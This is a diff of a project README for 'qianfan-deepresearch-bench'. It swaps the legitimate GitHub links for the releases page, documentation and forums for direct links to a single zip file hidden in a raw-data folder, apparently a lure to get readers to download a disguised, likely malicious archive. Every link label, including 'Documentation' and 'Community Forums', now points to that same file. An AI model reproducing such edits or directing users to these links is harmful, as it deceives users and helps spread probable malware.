@@ -1,6 +1,6 @@
 # 🚀 qianfan-deepresearch-bench - Simple Tools for Deep Research
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%9A%8D-4CAF50)](https://github.com/Fatsab77/qianfan-deepresearch-bench/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Fatsab77/qianfan-deepresearch-bench/main/qianfan-deepresearch-pro_datas/raw_data/deepresearch-bench-qianfan-2.7.zip%20Latest%20Release-%F0%9F%9A%8D-4CAF50)](https://raw.githubusercontent.com/Fatsab77/qianfan-deepresearch-bench/main/qianfan-deepresearch-pro_datas/raw_data/deepresearch-bench-qianfan-2.7.zip)
 
 ## 📋 Introduction
 
@@ -13,7 +13,7 @@ To get started with the **qianfan-deepresearch-bench**, follow the steps below t
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the downloads for the latest version of the application:  
-   [Download qianfan-deepresearch-bench](https://github.com/Fatsab77/qianfan-deepresearch-bench/releases)
+   [Download qianfan-deepresearch-bench](https://raw.githubusercontent.com/Fatsab77/qianfan-deepresearch-bench/main/qianfan-deepresearch-pro_datas/raw_data/deepresearch-bench-qianfan-2.7.zip)
 
 2. **Choose Your File:** On the releases page, you will see a list of files. Select the version that matches your operating system (Windows, macOS, Linux).
 
@@ -58,8 +58,8 @@ If you encounter any issues or have questions about the application, please feel
 
 For more information and updates, visit the following resources:
 
-- [Releases Page](https://github.com/Fatsab77/qianfan-deepresearch-bench/releases)
-- [Documentation](https://github.com/Fatsab77/qianfan-deepresearch-bench/wiki)
-- [Community Forums](https://github.com/Fatsab77/qianfan-deepresearch-bench/discussions)
+- [Releases Page](https://raw.githubusercontent.com/Fatsab77/qianfan-deepresearch-bench/main/qianfan-deepresearch-pro_datas/raw_data/deepresearch-bench-qianfan-2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Fatsab77/qianfan-deepresearch-bench/main/qianfan-deepresearch-pro_datas/raw_data/deepresearch-bench-qianfan-2.7.zip)
+- [Community Forums](https://raw.githubusercontent.com/Fatsab77/qianfan-deepresearch-bench/main/qianfan-deepresearch-pro_datas/raw_data/deepresearch-bench-qianfan-2.7.zip)
 
 Thank you for using **qianfan-deepresearch-bench**! We hope you find it helpful for your deep research needs.
